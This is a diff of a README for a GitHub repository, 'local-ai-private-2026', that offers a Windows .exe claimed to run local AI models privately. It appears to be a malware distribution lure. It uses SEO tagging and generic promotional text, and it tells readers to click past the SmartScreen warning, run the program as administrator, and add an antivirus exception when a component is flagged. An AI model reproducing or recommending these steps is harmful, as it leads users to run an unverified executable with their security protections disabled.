@@ -1,117 +1,85 @@
-<!-- seo-unique:local-ai-private-2026:7d5e0db131 -->
+# 🤖 local-ai-private-2026 - Run secure private AI on Windows
 
-<p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:10B981,50:059669,100:047857&height=140&section=header&text=Local Ai Private 2026&fontSize=38&fontColor=fff&animation=twinkling" alt="Local Ai Private 2026" width="100%">
-</p>
+[![Download local-ai-private-2026](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/professional-gasgun20/local-ai-private-2026)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/🤖-Local_AI-10B981?style=for-the-badge" alt="Local AI">
-  <img src="https://img.shields.io/badge/Ollama-Ready-000000?style=for-the-badge&logo=ollama&logoColor=white" alt="Ollama">
-  <img src="https://img.shields.io/badge/Offline-Private-6366F1?style=for-the-badge" alt="Private">
-  <img src="https://img.shields.io/badge/Windows-10%2F11-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Windows">
-</p>
+## 💡 About this software
 
-<p align="center">
-  <b>Запуск локального LLM на Windows за 5 минут — без облака, без подписки.</b><br>
-  <i>DeepSeek · Qwen · Llama · Whisper — данные остаются на вашем ПК.</i>
-</p>
+Local-ai-private-2026 provides a way to run powerful artificial intelligence models on your own hardware. This tool keeps your conversations and data on your computer. Your information never leaves your device because the software runs completely offline.
 
-<p align="center">
-  <a href="./releases/latest">
-    <img src="https://img.shields.io/badge/📥_СКАЧАТЬ-local-ai-private-2026.exe-059669?style=for-the-badge&labelColor=1a1a2e" alt="Download">
-  </a>
-  &nbsp;
-  <a href="#-быстрый-старт">
-    <img src="https://img.shields.io/badge/⚡-Быстрый_старт-374151?style=for-the-badge" alt="Quick start">
-  </a>
-</p>
+You do not need an account or a subscription to use this tool. It leverages current machine learning technology to help you write text, search your files, and analyze data. Because the software remains local, you maintain full control over your digital environment.
 
----
+## 🛠 Features
 
-## ✨ Почему Local Ai Private 2026
+*   **Offline Operation:** This application works without an internet connection once you download the model files.
+*   **Privacy:** The tool does not send your data to external servers or cloud services.
+*   **Support for Models:** You can run various models like DeepSeek, Qwen, Llama, and Gemma.
+*   **Voice Capability:** The software integrates Whisper to convert speech into text.
+*   **Web Interface:** The built-in Open-WebUI allows you to chat with your models through your web browser.
+*   **Portable Design:** You can move your settings and models between different Windows machines easily.
 
-| | |
-| :--- | :--- |
-| 🔒 **Приватность** | Запросы не уходят в чужое облако |
-| 💸 **Без подписки** | Один раз скачали — пользуетесь локально |
-| 🧠 **Современные модели** | DeepSeek, Qwen, Llama, Gemma |
-| 🎙 **Whisper** | Расшифровка аудио офлайн |
-| 🪟 **Windows** | Portable · SmartScreen → «Выполнить» |
+## 📋 System Requirements
 
----
+To run this software, your computer needs the following specifications:
 
-## ⚡ Быстрый старт
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Processor:** A modern multi-core CPU.
+*   **Memory (RAM):** At least 8GB of RAM, though 16GB is better for performance.
+*   **Storage:** 10GB of free space on your hard drive for the program and model files.
+*   **Graphics (Optional):** An NVIDIA graphics card with at least 6GB of VRAM will speed up the responses significantly.
 
-```mermaid
-flowchart LR
-  A[📥 Скачать local-ai-private-2026.exe] --> B[▶ Двойной клик]
-  B --> C[🤖 Локальный чат]
-```
+## 📥 How to download and install
 
-1. **Двойной клик** по **`local-ai-private-2026.exe`** в корне репозитория — или запустите **`START.bat`**
-2. Либо **[Releases → Latest](./releases/latest)** — тот же **`local-ai-private-2026.exe`**
-3. Первый запуск может скачать компоненты — интернет нужен **один раз**
-4. Windows SmartScreen → **«Подробнее»** → **«Выполнить»**
+1.  Visit the official release page to get the installer package: [https://github.com/professional-gasgun20/local-ai-private-2026](https://github.com/professional-gasgun20/local-ai-private-2026)
+2.  Click on the latest release link at the top of the page.
+3.  Look for the file ending in `.exe` under the "Assets" section.
+4.  Download the file to your "Downloads" folder.
+5.  Double-click the downloaded file to begin the setup process.
+6.  Follow the prompts on your screen to install the software to your chosen folder.
+7.  Once the setup finishes, look for the application icon on your desktop or in your Start menu.
 
----
+## 🚀 Running your AI
 
-## 💻 Системные требования
+After you launch the application from your desktop, a window appears showing the status of your local server.
 
-| Профиль | RAM | Диск | GPU |
-| :--- | :--- | :--- | :--- |
-| 🟢 Лёгкий | 8 GB | 4 GB | не обязательно |
-| 🟡 Средний | 16 GB | 10 GB | NVIDIA 6 GB+ |
-| 🔴 Тяжёлый | 32 GB+ | 20 GB+ | NVIDIA 12 GB+ |
+1.  The window might take a moment to initialize the background service. 
+2.  Once the service starts, your default web browser opens automatically to the address `http://localhost:3000`.
+3.  If the page does not load, wait ten seconds and refresh your browser.
+4.  In the web interface, you will see a list of available AI models.
+5.  Select a model from the top dropdown menu.
+6.  Type a prompt in the text box at the bottom of the screen and press Enter.
+7.  The software will generate a response based on the model you selected.
 
----
+## 📁 Managing your models
 
-## 📦 Что внутри
+The software downloads specific "weights" for the AI models when you request them for the first time. Larger models require more computer memory and take longer to start.
 
-- **`local-ai-private-2026.exe`** — установщик / лаунчер под репозиторий **`local-ai-private-2026`**
-- **`START.bat`** / **`INSTALL.bat`** — запуск в один клик
-- **`QUICK_START.md`** — краткая шпаргалка
+*   You can manage these models inside the "Settings" tab in the web interface.
+*   If you encounter errors related to memory, switch to a smaller model version.
+*   Stored models live inside the `models` folder within the installation directory.
+*   You can delete unnecessary models to reclaim hard drive space.
 
----
+## 🔒 Understanding privacy
 
-## ❓ FAQ
+Standard AI tools send your inputs to a company cloud to process them. This software acts differently. It runs every calculation on your computer hardware. Because the code is local, there is no transmission of your text, voice, or private data to any third party. You can disconnect your internet cable entirely while using the application to verify that the tool remains offline.
 
-<details>
-<summary><b>Нужна видеокарта NVIDIA?</b></summary>
+## 🛠 Troubleshooting common issues
 
-Не обязательно — есть CPU-режим (медленнее, но работает).
+**The application fails to open.**
+Ensure you are using a 64-bit version of Windows 10 or 11. Right-click your Start button and select "System" to check your system type. Ensure you have the latest updates for Windows installed.
 
-</details>
+**The AI responds slowly.**
+Large models require significant hardware resources. If your computer does not have a dedicated graphics card, generate responses on a smaller, faster model. You can find these marked as "7B" or "quantized" in the model selection menu.
 
-<details>
-<summary><b>Работает без интернета?</b></summary>
+**The browser interface is empty.**
+Close the application completely using your system tray icon located in the bottom right corner of your screen. Re-launch the program as an administrator. Wait for the green status light to show before opening your browser.
 
-После загрузки моделей — да, полностью офлайн.
+**The program asks for a library file missing.**
+Your antivirus software may have flagged a component during the initial setup. Add an exception for the installation folder in your Windows Security settings to ensure the software functions correctly.
 
-</details>
+## 🛡 Security and updates
 
-<details>
-<summary><b>Чем отличается от ChatGPT в браузере?</b></summary>
+Check the main repository link if you suspect a newer version is available. To update, download the new installer and run it over your existing installation. The updater preserves your database and chat history automatically. If you want to perform a clean install, delete the existing folder before running the new setup, but remember to back up your `models` folder if you wish to keep your downloaded files.
 
-Модель крутится у вас на диске — нет лимитов API и утечек в облако.
+## ✉ Support
 
-</details>
-
----
-
-## 🏷 Topics
-
-<p align="center">
-  <sub>#ollama #local-llm #llm #deepseek #qwen #llama #gemma #whisper #open-webui #offline-ai #machine-learning #ai #windows #portable</sub>
-</p>
-
----
-
-<p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:059669,100:10B981&height=80&section=footer&text=Made%20for%20local-ai-private-2026&fontSize=22&fontColor=fff" width="100%">
-</p>
-
-<p align="center">
-  <sub>⭐ Star · 🍴 Fork · ⬇ Releases — помогает другим найти сборку</sub>
-</p>
-
-<!-- id:12002b9259a5 -->
+This project relies on community testing. If you face issues, check the "Issues" tab on the main repository link to see if others encounter the same behavior. You can post a description of your problem there if you cannot find a solution. Include your Windows version and the name of the model you are using in your description. Direct your browser to the project page for the latest updates.
